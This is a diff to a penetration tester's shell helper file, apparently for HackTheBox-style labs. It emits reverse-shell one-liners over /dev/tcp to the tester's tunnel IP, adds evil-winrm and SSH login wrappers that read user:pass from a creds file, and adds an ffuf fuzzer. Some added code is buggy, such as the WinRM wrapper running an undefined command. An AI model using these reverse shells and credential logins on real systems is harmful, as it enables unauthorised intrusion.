@@ -15,9 +15,17 @@ function grev() {
 	"blind")
 		echo "(sh)0>/dev/tcp/$(gtunip)/1233"
 		;;
-	*)
+	"bash")
 		# Fallback to bash reverse shell
 		echo "bash -c 'bash -i >& /dev/tcp/$(gtunip)/1233 0>&1'"
+		;;
+	*)
+		# Show all reverse shells available, in a colorful way
+		which grev | grep -E '")' | grep -v 'show' | while read line; do
+			title=$(awk -F '"' '{print $2}' <<< $line)
+			content=$(grev $title)
+			echo -e "\e[1;32m$title\e[0m - $content"
+		done
 		;;
 	esac
 
@@ -71,13 +79,24 @@ function htbc() {
 	upvar starting_path "$(pwd)"
 }
 
-# Logs in by ssh to the target ip address using a credentials file (user:pass)
-function sshcreds() {
+function guser(){ guserpass "$1" | column 1 ':'; }
+
+function gpass(){ guserpass "$1" | column 2 ':'; }
+
+function guserpass() {
 	# Read the credentials from the file
 	local creds_file="creds"
 	local creds_line
+  
+  # Check if an line_number has been provided
+  if [ -n "$1" ]; then
+    line_number="$1"
+  else
+    line_number=1
+  fi
+  
 	if [[ -f "$creds_file" ]]; then
-		creds_line=$(head -n 1 "$creds_file")
+		creds_line=$(head -n $line_number "$creds_file" | tail -n1)
 	else
 		echo "Credentials file not found."
 		return 1
@@ -86,10 +105,38 @@ function sshcreds() {
 	# Extract the username and password from the credentials line
 	local username=${creds_line%%:*}
 	local password=${creds_line#*:}
+  echo -ne "$username:$password"
+}
 
-	local ip=$1
+# Logs in by ssh to the target ip address using a credentials file (user:pass)
+function winrmcreds() {
+  username=$(guser "$@")
+  password=$(gpass "$@")
+  
+	local ip=$2
 	# Check if an IP address is provided
-	if [[ -z $1 ]]; then
+	if [[ -z $2 ]]; then
+		echo "IP address not provided, using target ($tip)"
+		local ip="$tip"
+	fi
+
+	# Form the SSH command
+	shift
+	local winrm_command="evil-winrm -u '$username' -p '$password' $tip"
+
+	# Execute the SSH command
+	echo "Logging in to $username@$ip..."
+	bash -c "$ssh_command"
+}
+
+# Logs in by ssh to the target ip address using a credentials file (user:pass)
+function sshcreds() {
+  username=$(guser "$@")
+  password=$(gpass "$@")
+  
+	local ip=$2
+	# Check if an IP address is provided
+	if [[ -z $2 ]]; then
 		echo "IP address not provided, using target ($tip)"
 		local ip="$tip"
 	fi
@@ -118,13 +165,73 @@ decode_jwt() {
 	decode_base64_url $(echo -n $2 | cut -d "." -f $1) | jq .
 }
 
+superfuzz() {
+	function usage(){
+			echo "Usage: $0 [-h] [-d] [-e] <url>"
+			echo "Default: $0 -dve txt,json,yaml -o fuzz.txt <url>"
+			echo "Options:"
+			echo "  -h  Show this help message and exit"
+			echo "  -d  Fuzz directories"
+			echo "  -v  Fuzz virtual hosts"
+			echo "  -o  Output file"
+			echo "  -e  Extensions to fuzz (comma separated)"
+	}
+	# If no arguments are provided, use the default ones
+	if [[ $# -eq 0 ]]; then
+		dirs=true
+		vhosts=true
+		extensions="txt,json,yaml"
+		output="fuzz.txt"
+	fi
+
+	while getopts ":hvde:o:" opt; do
+		case $opt in
+		h)
+			usage
+			return 0
+			;;
+		v)
+			vhosts=true
+			;;
+		d)
+			dirs=true
+			;;
+		e)
+			extensions="$OPTARG"
+			;;
+		o)
+			output="$OPTARG"
+			;;
+		\?)
+			echo "Invalid option: -$OPTARG" >&2
+			usage
+			return 1
+			;;
+		:)
+			echo "Option -$OPTARG requires an argument." >&2
+			return 1
+			;;
+		esac
+	done
+
+
+	# Fuzz directories
+	if [[ $dirs == true ]]; then
+		echo "[+] Fuzzing directories..."
+		ffuf -w $dirlist -u $1/FUZZ -o $output -of html -t 200 -c -v
+	fi
+}
+
 # Decode JWT header
 alias jwth="decode_jwt 1"
 
 # Decode JWT Payload
 alias jwtp="decode_jwt 2"
 
+alias sd="show_dicts"
+
 ### Variables
+# Dicts
 export vhlist='/home/js/hacking/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt'
 export dirlist='/home/js/hacking/wordlists/dirbuster/directory-list-2.3-medium.txt'
 export rockyou='/home/js/hacking/wordlists/rockyou-utf-8.txt'
@@ -136,3 +243,6 @@ export secrets='/home/js/hacking/wordlists/jwt.secrets.list'
 export nginx='/home/js/hacking/wordlists/nginx.txt'
 export springboot='/home/js/hacking/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt'
 export names='/home/js/hacking/wordlists/SecLists/Usernames/Names/names.txt'
+export iis='/home/js/hacking/wordlists/iisfinal.txt'
+export common='/home/js/hacking/wordlists/SecLists/Discovery/Web-Content/common.txt'
+# /Dicts
